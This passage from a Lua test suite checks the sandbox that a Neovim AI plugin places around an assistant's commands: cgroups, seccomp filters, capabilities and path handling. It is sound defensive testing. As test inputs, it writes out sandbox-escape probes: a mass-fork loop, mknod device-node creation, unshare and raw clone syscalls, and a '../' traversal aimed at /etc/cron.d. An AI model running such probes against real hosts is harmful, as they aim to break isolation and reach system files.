      t.not_nil(evidence.get(dec), "裁决记录默认保留供回放")
    end)
  end)

  it("cgroup：资源域创建、限制写入与释放", function(t)
    local cgroup = require("NeoAI.sandbox.cgroup")
    local caps = cgroup.probe()
    if not caps.available then return end
    local h = cgroup.prepare("test_attempt_cg", { pids = 4, memory_bytes = 64 * 1024 * 1024 })
    t.not_nil(h, "应能创建资源域")
    t.eq(1, vim.fn.isdirectory(h.path), "资源域目录应存在")
    local pids = vim.fn.readfile(h.path .. "/pids.max")
    t.eq("4", pids[1] and pids[1]:gsub("%s", "") or "")
    local mem = vim.fn.readfile(h.path .. "/memory.max")
    t.eq(tostring(64 * 1024 * 1024), mem[1] and mem[1]:gsub("%s", "") or "")
    t.eq("table", type(cgroup.join_prefix(h)))
    cgroup.release(h)
    t.eq(0, vim.fn.isdirectory(h.path), "释放后资源域目录应删除")
  end)

  it("cgroup：进程受 PID 上限约束", function(t)
    local cgroup = require("NeoAI.sandbox.cgroup")
    if not cgroup.probe().available then return end
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", limits = { pids = 8 } } } }, function()
      local sandbox = require("NeoAI.sandbox")
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "for i in $(seq 1 50); do sleep 5 & done; echo forked", description = "t",
      }, {}):then_(function(r)
        t.matches("[Ff]ork", tostring(r), "PID 上限应阻止超额 fork")
        done = true
      end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(10000, function() return done end), "命令应完成")
    end)
  end)

  it("seccomp：显式缺失过滤器时 require_seccomp 拒绝", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local seccomp = require("NeoAI.sandbox.seccomp")
    seccomp.reset()
    with_config({ tools = { sandbox = { require_seccomp = true, seccomp = { filter_path = "/nonexistent/x.bpf" } } } }, function()
      local ok, err = runtime.check_available()
      t.false_(ok, "显式过滤器缺失时应拒绝")
      t.matches("SECCOMP", tostring(err))
    end)
    local filter = vim.fn.tempname()
    vim.fn.writefile({ "dummy" }, filter)
    with_config({ tools = { sandbox = { require_seccomp = true, seccomp = { filter_path = filter } } } }, function()
      seccomp.reset()
      t.true_(seccomp.available(), "提供过滤器文件后应可用")
      t.true_(runtime.check_available())
    end)
    vim.fn.delete(filter)
  end)

  it("seccomp：内置过滤器生成且被 bwrap 施加", function(t)
    local seccomp = require("NeoAI.sandbox.seccomp")
    t.not_nil(seccomp.build_filter("x86_64"), "应能生成 x86_64 过滤器")
    t.not_nil(seccomp.build_filter("aarch64"), "应能生成 aarch64 过滤器")
    if require("NeoAI.sandbox.runtime").backend() ~= "bwrap" then return end
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", seccomp = { enabled = true } } } }, function()
      local sandbox = require("NeoAI.sandbox")
      sandbox.reset()
      seccomp.reset()
      local done = false
      -- 过滤器已加载：Seccomp 模式应为 2（FILTER）
      require("NeoAI.tools").execute("run_command", {
        command = "grep Seccomp /proc/self/status", description = "t",
      }, {}):then_(function(r)
        t.matches("Seccomp:%s*2", tostring(r), "沙箱进程应加载 seccomp 过滤器")
        -- 被禁 syscall 返回 EPERM
        local done2 = false
        require("NeoAI.tools").execute("run_command", {
          command = "unshare -Ur true 2>&1", description = "t",
        }, {}):then_(function(r2)
          t.matches("not permitted", tostring(r2), "unshare 应被 seccomp 拒绝")
          done2 = true
        end, function(e) t.true_(false, tostring(e and e.message or e)); done2 = true end)
        t.true_(vim.wait(8000, function() return done2 end), "被禁 syscall 测试应完成")
        done = true
      end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(8000, function() return done end), "seccomp 模式检查应完成")
    end)
  end)

  it("seccomp：设备节点屏障——mknod CHR/BLK 拒绝（即便完整 root 能力），FIFO 放行", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local seccomp = require("NeoAI.sandbox.seccomp")
    if runtime.backend() ~= "bwrap" then return end
    if vim.fn.executable("mknod") ~= 1 or vim.fn.executable("mkfifo") ~= 1 then return end
    -- 结构性：过滤器生成不报错（mknod/mknodat 的 mode 条件块已并入）
    t.not_nil(seccomp.build_filter("x86_64"), "应能生成 x86_64 过滤器")
    t.not_nil(seccomp.build_filter("aarch64"), "应能生成 aarch64 过滤器")
    -- 实测：显式授予完整 root 能力（cap_add={"ALL"}，含 CAP_MKNOD）时，
    -- 块/字符设备节点仍被 seccomp 拒绝（裸磁盘读通道封死）；FIFO/普通文件不受影响。
    with_config({ tools = { approval = { mode = "async" }, sandbox = {
      mode = "dry_run", cap_add = { "ALL" }, seccomp = { enabled = true },
    } } }, function()
      local sandbox = require("NeoAI.sandbox")
      sandbox.reset()
      seccomp.reset()
      local done = 0
      local function step(cmd, check)
        require("NeoAI.tools").execute("run_command", { command = cmd, description = "t" }, {})
          :then_(function(r)
            check(tostring(r))
            done = done + 1
          end, function(e)
            check("ERR:" .. tostring(e and e.message or e))
            done = done + 1
          end)
      end
      step("mknod /tmp/.sbx_blk b 8 0 && echo DEVICE_CREATED", function(out)
        local low = out:lower()
        t.true_(not low:find("device_created", 1, true), "块设备节点不应创建成功（实际: " .. out .. "）")
        t.true_(low:find("not permitted", 1, true) ~= nil, "块设备应被 seccomp 拒绝（EPERM）")
      end)
      step("mknod /tmp/.sbx_chr c 1 3 && echo DEVICE_CREATED", function(out)
        local low = out:lower()
        t.true_(not low:find("device_created", 1, true), "字符设备节点不应创建成功（实际: " .. out .. "）")
        t.true_(low:find("not permitted", 1, true) ~= nil, "字符设备应被 seccomp 拒绝（EPERM）")
      end)
      step("mkfifo /tmp/.sbx_fifo && echo FIFO_OK", function(out)
        t.true_(out:find("FIFO_OK", 1, true) ~= nil, "FIFO 应不受设备节点屏障影响（实际: " .. out .. "）")
      end)
      t.true_(vim.wait(15000, function() return done >= 3 end), "mknod/mkfifo 测试应完成")
      pcall(os.remove, "/tmp/.sbx_blk")
      pcall(os.remove, "/tmp/.sbx_chr")
      pcall(os.remove, "/tmp/.sbx_fifo")
    end)
  end)

  it("seccomp：clone 带命名空间标志被拒绝、clone3 返回 ENOSYS", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" or vim.fn.executable("python3") ~= 1 then return end
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", seccomp = { enabled = true } } } }, function()
      sandbox.reset()
      require("NeoAI.sandbox.seccomp").reset()
      local py = table.concat({
        "import ctypes,os",
        "libc=ctypes.CDLL('libc.so.6',use_errno=True)",
        "ctypes.set_errno(0); libc.syscall(56,0x10000000|17,0,0,0,0); print('CLONE_NEWUSER',ctypes.get_errno())",
        "ctypes.set_errno(0); libc.syscall(435,0,0); print('CLONE3',ctypes.get_errno())",
      }, "\n")
      local cmd = "python3 - <<'PY'\n" .. py .. "\nPY"
      local done = false
      require("NeoAI.tools").execute("run_command", { command = cmd, description = "t" }, {}):then_(function(r)
        local s = tostring(r)
        t.matches("CLONE_NEWUSER 1", s, "clone(CLONE_NEWUSER) 应 EPERM，实际: " .. s)
        t.matches("CLONE3 38", s, "clone3 应 ENOSYS，实际: " .. s)
        done = true
      end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(20000, function() return done end), "clone 过滤测试应完成")
    end)
  end)

  it("seccomp：socket 地址族白名单（AF_VSOCK 等被拒绝，AF_INET 放行）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" or vim.fn.executable("python3") ~= 1 then return end
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", seccomp = { enabled = true } } } }, function()
      sandbox.reset()
      require("NeoAI.sandbox.seccomp").reset()
      local py = table.concat({
        "import socket",
        "def t(fam,name):",
        "    try:",
        "        s=socket.socket(fam,socket.SOCK_STREAM); s.close(); print(name,'OK')",
        "    except OSError as e: print(name,e.errno)",
        "t(40,'VSOCK')",
        "t(38,'ALG')",
        "t(2,'INET')",
      }, "\n")
      local cmd = "python3 - <<'PY'\n" .. py .. "\nPY"
      local done = false
      require("NeoAI.tools").execute("run_command", { command = cmd, description = "t" }, {}):then_(function(r)
        local s = tostring(r)
        t.matches("VSOCK 1", s, "AF_VSOCK 应 EPERM，实际: " .. s)
        t.matches("ALG 1", s, "AF_ALG 应 EPERM，实际: " .. s)
        t.matches("INET OK", s, "AF_INET 应放行，实际: " .. s)
        done = true
      end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(20000, function() return done end), "socket 白名单测试应完成")
    end)
  end)

  it("加固：read_file 读 /proc 经 conceal 脱敏（不泄露 overlay 真实路径）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local sandbox = require("NeoAI.sandbox")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run" } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("read_file",
        { filepath = "/proc/self/mountinfo", description = "t" }, {}):then_(function(r)
        local s = tostring(r)
        t.true_(not s:find("/.cache-", 1, true), "不应泄露 overlay 私有基目录，实际: " .. s)
        if store.root() and store.root() ~= "" then
          t.true_(not s:find(store.root(), 1, true), "不应泄露沙箱存储根")
        end
        -- 若存在 lowerdir 行，其路径必须已被替换为 hidden
        if s:find("lowerdir=", 1, true) then
          t.matches("lowerdir=hidden", s, "lowerdir 路径应脱敏")
        end
        done = true
      end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(15000, function() return done end), "read_file /proc 测试应完成")
    end)
  end)

  it("加固：默认最小权限（CapEff=0 + 收敛主机全局能力）+ seccomp；可显式放宽", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local sandbox = require("NeoAI.sandbox")
    -- 默认：最小权限（CapEff 全 0）且收敛主机全局能力；seccomp 生效。
    with_config({
      tools = {
        approval = { mode = "async" },
        sandbox = { mode = "dry_run", review = { enabled = true }, seccomp = { enabled = true } },
      },
    }, function()
      sandbox.reset()
      local done, out = false, nil
      require("NeoAI.tools").execute("run_command", {
        command = "grep -E 'CapEff|Seccomp:' /proc/self/status",
        description = "t",
      }, {}):then_(function(r)
        out = tostring(r)
        done = true
      end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(8000, function() return done end), "命令应完成")
      t.matches("Seccomp:%s*2", out, "应加载 seccomp 过滤器")
      t.true_(out:find("CapEff:%s*0+\n") ~= nil, "默认应为最小权限（无 capability）")
    end)
    -- 显式放宽：cap_add = { "ALL" } → 持有完整能力，seccomp 仍生效。
    with_config({
      tools = {
        approval = { mode = "async" },
        sandbox = { cap_add = { "ALL" }, mode = "dry_run", review = { enabled = true }, seccomp = { enabled = true } },
      },
    }, function()
      sandbox.reset()
      local done, out = false, nil
      require("NeoAI.tools").execute("run_command", {
        command = "grep -E 'CapEff|Seccomp:' /proc/self/status",
        description = "t",
      }, {}):then_(function(r)
        out = tostring(r)
        done = true
      end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(8000, function() return done end), "命令应完成")
      t.true_(out:find("CapEff:%s*0*[1-9a-f]") ~= nil, "cap_add={ALL} 应持有完整 root 能力")
      t.matches("Seccomp:%s*2", out, "应加载 seccomp 过滤器")
    end)
    -- 前缀级（最小权限模式下）：含包管理器的命令（含链式）按需加回窄能力；普通命令不加回。
    local privilege = require("NeoAI.sandbox.privilege")
    local spec = { effect = "process" }
    local function prefix_for(cmd)
      local req = privilege.classify("run_command", { command = cmd }, spec)
      local r = privilege.resolve(req.tier, req)
      t.true_(r.ok, "应可解析: " .. cmd)
      return table.concat(runtime.process_prefix({ cwd = "/tmp", privileges = r.privileges }), " ")
    end
    with_config({ tools = { sandbox = { cap_add = {} } } }, function()
      local pkg = prefix_for("apt-get install -y build-essential")
      t.true_(pkg:find("--cap-drop ALL", 1, true) ~= nil, "包安装也应从最小权限起步")
      t.true_(pkg:find("--cap-add CAP_DAC_OVERRIDE", 1, true) ~= nil, "纯包安装应按需加回窄能力")
      local mixed = prefix_for("apt-get update && cat /etc/hosts")
      t.true_(mixed:find("--cap-drop ALL", 1, true) ~= nil, "链式包命令仍从最小权限起步")
      t.true_(mixed:find("--cap-add CAP_DAC_OVERRIDE", 1, true) ~= nil,
        "链式包命令也应加回窄能力（apt 需 chown/setuid 到 _apt）")
      local plain = prefix_for("ls -la")
      t.true_(plain:find("--cap-drop ALL", 1, true) ~= nil, "普通命令应最小权限")
      t.true_(plain:find("--cap-add", 1, true) == nil, "普通命令不应加 capability")
    end)
  end)

  it("cache：内容寻址读写与清理", function(t)
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() } } }, function()
      sandbox.reset()
      local cache = require("NeoAI.sandbox.cache")
      local k1 = cache.key({ a = 1, b = { 2, 3 } })
      local k2 = cache.key({ b = { 2, 3 }, a = 1 })
      t.eq(k1, k2, "键应对字段顺序稳定")
      t.false_(cache.has(k1))
      t.true_(cache.put(k1, "content-1"))
      t.true_(cache.has(k1))
      t.eq("content-1", cache.get(k1))
      t.true_(#cache.list() >= 1)
      local removed = cache.prune(-1)
      t.true_(removed >= 1, "应清理过期缓存")
      t.false_(cache.has(k1))
    end)
  end)

  it("故障注入：发布失败不产生部分写入", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "commit" } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, "v1\n")
      sandbox.fault.set("publish", 1)
      local done = false
      require("NeoAI.tools").execute("edit_file", { filepath = p, mode = "write", content = "v2\n", description = "t" }, {})
        :then_(function() t.true_(false, "注入发布失败时不应成功"); done = true end, function(e)
          t.matches("注入的发布失败", tostring(e and e.message or e))
          t.eq("v1", trim(fs.read_file(p)), "发布失败不应写入真实工作区")
          done = true
        end)
      t.true_(vim.wait(3000, function() return done end), "应快速失败")
      t.true_(#sandbox.fault.history() >= 1, "注入应被记录")
      fs.delete_file(p)
    end)
  end)

  it("故障注入：后端不可用时进程被拒绝", function(t)
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run" } } }, function()
      sandbox.reset()
      sandbox.fault.set("backend", 1)
      local done = false
      require("NeoAI.tools").execute("run_command", { command = "echo x", description = "t" }, {})
        :then_(function() t.true_(false, "注入后端不可用时不应成功"); done = true end, function(e)
          t.matches("SANDBOX_BACKEND_UNAVAILABLE", tostring(e and e.message or e))
          done = true
        end)
      t.true_(vim.wait(3000, function() return done end), "应快速失败")
    end)
  end)

  it("故障注入：候选冻结失败被拒绝", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run" } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, "v1\n")
      sandbox.fault.set("freeze", 1)
      local done = false
      require("NeoAI.tools").execute("edit_file", { filepath = p, mode = "write", content = "v2\n", description = "t" }, {})
        :then_(function() t.true_(false, "冻结失败不应成功"); done = true end, function(e)
          t.matches("冻结失败", tostring(e and e.message or e))
          t.eq(0, #sandbox.list_reviews({ review_state = "PENDING" }), "不应产生待审变更单元")
          done = true
        end)
      t.true_(vim.wait(3000, function() return done end), "应快速失败")
      fs.delete_file(p)
    end)
  end)

  it("性能基准：关键路径可测量", function(t)
    local sandbox = require("NeoAI.sandbox")
    local results = sandbox.bench.run({ iterations = 50 })
    for _, name in ipairs({ "policy_eval", "digest", "new_attempt", "envelope_build" }) do
      t.not_nil(results[name], name .. " 应有结果")
      t.eq(50, results[name].iterations)
      t.true_(results[name].total_ms >= 0)
      t.true_(results[name].per_op_ms >= 0)
    end
  end)

  it("派生 revision：按内容拆分后重新审查且不迁移旧批准", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, "v1\n")
      local done = false
      require("NeoAI.tools").execute("edit_file", { filepath = p, mode = "write", content = "v2\n", description = "t" }, {})
        :then_(function()
          local parent = sandbox.list_reviews({ review_state = "PENDING" })[1]
          sandbox.approve(parent.change_set_id) -- 旧版已批准但未应用
          local child = sandbox.derive_revision(parent.change_set_id, { contents = { [p] = "v3\n" } })
          t.not_nil(child, "应派生出新 revision")
          t.eq(2, child.revision)
          t.eq(parent.change_set_id, child.supersedes)
          -- 原变更单元应标记 SUPERSEDED（不迁移旧批准）
          local parent_state
          for _, it in ipairs(sandbox.list_reviews()) do
            if it.change_set_id == parent.change_set_id then parent_state = it.review_state end
          end
          t.eq("SUPERSEDED", parent_state, "原变更单元应标记 SUPERSEDED")
          local res = sandbox.apply(child.change_set_id, { auto_approve = true })
          t.true_(res.ok, tostring(res.reason))
          t.eq("v3", trim(fs.read_file(p)), "应用派生版本应写入新内容")
          fs.delete_file(p)
          done = true
        end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(3000, function() return done end), "edit_file 应完成")
    end)
  end)

  it("run_command 无法看到沙箱自身存储（对 AI 不可见）", function(t)
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    local store = require("NeoAI.sandbox.store")
    if runtime.backend() ~= "bwrap" then return end
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local root = store.root()
      t.not_nil(root)
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "find " .. root .. " -maxdepth 3 2>/dev/null; echo END",
        description = "t",
      }, {}):then_(function(r)
        local s = tostring(r)
        t.true_(not s:find("sessions", 1, true), "不应看到 sessions 目录")
        t.true_(not s:find("candidates", 1, true), "不应看到 candidates 目录")
        t.true_(not s:find("reviews", 1, true), "不应看到 reviews 目录")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(30000, function() return done end), "run_command 应完成")
    end)
  end)

  it("热重载后待审修改重新物化，只读工具视图保持一致", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      local tools = require("NeoAI.tools")
      tools.execute("run_command", {
        command = "mkdir -p sub; echo hi > sub/a.txt", description = "t",
      }, {}):then_(function()
        t.eq(1, #sandbox.list_reviews({ review_state = "PENDING" }), "应有一个待审单元")
        -- 模拟插件热重载：shutdown 清空暂存，init 重新物化待审候选
        sandbox.shutdown()
        sandbox.init()
        return tools.execute("list_files", { path = dir, recursive = true, description = "t" }, {})
      end):then_(function(r)
        local s = tostring(r)
        t.matches("sub/", s, "重载后仍应看到沙箱新建目录")
        t.matches("a%.txt", s, "重载后仍应看到沙箱新建文件")
        return tools.execute("read_file", { filepath = dir .. "/sub/a.txt", description = "t" }, {})
      end):then_(function(r)
        t.matches("hi", tostring(r), "重载后应读到待审修改内容")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(20000, function() return done end), "热重载一致性检查应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("加固：发布前重规范化路径，拒绝 `..` 穿越与遮蔽目标", function(t)
    local fs = require("NeoAI.utils.fs")
    local candidate = require("NeoAI.sandbox.candidate")
    local root = vim.fn.tempname()
    fs.ensure_dir(root)
    -- 中间组件 `ghost` 不存在：旧实现 `fnamemodify(:p)` 不折叠 `..`，会以「工作区内」路径入队，
    -- 发布时才由内核解析到 root/pwned（工作区外）。现在应在发布前拒绝。
    local evil = root .. "/ghost/../pwned"
    local res = candidate.publish({
      candidate_digest = "sha256:escape",
      files = { { path = evil, action = "create", after_hash = "h", content = "PWN" } },
    })
    t.false_(res.ok, "非规范路径应拒绝")
    t.eq("CONFLICT", res.state)
    t.matches("PATH_CHANGED", tostring(res.reason))
    t.false_(fs.exists(root .. "/pwned"), "不得写到解析后的真实位置")
    -- 规范路径但命中宿主敏感遮蔽路径 → FAILED（纵深防御，防止落盘候选被篡改后发布）
    local secret = root .. "/secret.env"
    with_config({ tools = { sandbox = { mask_paths = { secret } } } }, function()
      local res2 = candidate.publish({
        candidate_digest = "sha256:masked",
        files = { { path = secret, action = "create", after_hash = "h", content = "x" } },
      })
      t.false_(res2.ok, "遮蔽目标应拒绝")
      t.eq("FAILED", res2.state)
      t.matches("MASKED", tostring(res2.reason))
    end)
    vim.fn.delete(root, "rf")
  end)

  it("加固：风险分级与审批 UI 解析路径，`..` 不伪装成工作区", function(t)
    local risk = require("NeoAI.sandbox.risk")
    local review_ui = require("NeoAI.ui.components.sandbox_review")
    local fs = require("NeoAI.utils.fs")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    -- 不存在的中间组件 + 多级 `..` 解析到工作区外系统路径
    local evil = dir .. "/ghost/" .. ("../"):rep(20) .. "etc/cron.d/pwn"
    t.eq(2, risk.path_level(evil), "解析后在工作区外应为系统级（旧实现误判为工作区 L0）")
    t.eq("system", review_ui.level_of(evil), "审批 UI 应标为系统路径")
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("策略：受限规则环境真正隔离（os/pcall 不可达）", function(t)
    local policy = require("NeoAI.sandbox.policy")
    with_config({ tools = { sandbox = { policy = { rules = {
      function() return { decision = os.getenv and "ALLOW" or "DENY" } end,
    } } } } }, function()
      local v = policy.evaluate({ tool = "x", effect = "read" })
      t.eq("DENY", v.decision, "os 不可达 → 规则报错 → DENY")
      t.true_(vim.tbl_contains(v.reason_codes, "POLICY_EVALUATION_FAILED"))
    end)
    -- pcall 被移出白名单：无法用它吞掉指令预算的 hook error
    policy.set_limits({ instruction_budget = 1000 })
    with_config({ tools = { sandbox = { policy = { rules = {
      function()
        pcall(function() while true do end end)
        return { decision = "ALLOW" }
      end,
    } } } } }, function()
      local v = policy.evaluate({ tool = "x", effect = "read" })
      t.eq("DENY", v.decision, "pcall 不可达，预算拦截无法被吞")
    end)
    policy.reset()
  end)

  it("seccomp：x86_64 过滤器含 x32 ABI 位拦截，aarch64 无", function(t)
    local seccomp = require("NeoAI.sandbox.seccomp")
    local function has_x32_guard(arch)
      local f = seccomp.build_filter(arch)
      -- BPF_JSET_K(0x45) jt=0 jf=1 k=0x40000000（小端）
      return f ~= nil and f:find(string.char(0x45, 0, 0, 1, 0, 0, 0, 0x40), 1, true) ~= nil
    end
    t.true_(has_x32_guard("x86_64"), "x86_64 应拦截带 __X32_SYSCALL_BIT 的 syscall 号")
    t.false_(has_x32_guard("aarch64"), "aarch64 无 x32 ABI")
  end)

  it("加固：候选存储目录权限收紧为 0700", function(t)
    local store = require("NeoAI.sandbox.store")
    local dir = vim.fn.tempname()
    store.reset()
    store.init(dir)
    local st = vim.uv.fs_stat(dir .. "/candidates")
    t.not_nil(st, "候选目录应存在")
    t.eq(448, st.mode % 512, "候选目录权限应为 0700")
    store.reset()
    vim.fn.delete(dir, "rf")
  end)

  it("应用失败时条目保持待审（不从审批悬浮窗消失）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local review = require("NeoAI.sandbox.review")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      -- 1) 候选缺失：不入库候选，应用应失败但条目回退为待审
      local missing = {
        candidate_digest = "sha256:missing", created_at = os.time(), effect = "fs_write",
        files = { { path = "/tmp/neoai_missing.txt", action = "create", after_hash = "h", content = "x" } },
      }
      local item = review.enqueue(missing, { id = "cs_keep_missing", tool = "edit_file" })
      t.not_nil(item)
      local res = review.apply(item.change_set_id, { auto_approve = true })
      t.false_(res.ok, "候选缺失时应用应失败")
      t.eq("FAILED", res.state)
      local pending = sandbox.list_reviews({ review_state = "PENDING" })
      t.eq(1, #pending, "应用失败后条目不应消失")
      t.eq(item.change_set_id, pending[1].change_set_id, "应仍是同一待审条目")

      -- 2) 发布冲突：真实文件基线已变，应用失败后条目同样保持待审
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, "changed\n")
      local cand = {
        candidate_digest = "sha256:conflict", created_at = os.time(), effect = "fs_write",
        files = { { path = p, action = "modify", before_hash = "sha256:stale",
          after_hash = "sha256:new", content = "next\n" } },
      }
      store.write_candidate(cand)
      local it2 = review.enqueue(cand, { id = "cs_keep_conflict", tool = "edit_file" })
      local res2 = review.apply(it2.change_set_id, { auto_approve = true })
      t.false_(res2.ok, "基线变化时应用应冲突")
      t.eq("CONFLICT", res2.state)
      local pending2 = sandbox.list_reviews({ review_state = "PENDING" })
      t.eq(2, #pending2, "冲突后条目仍应在待审队列中")
      fs.delete_file(p)
    end)
  end)
end)

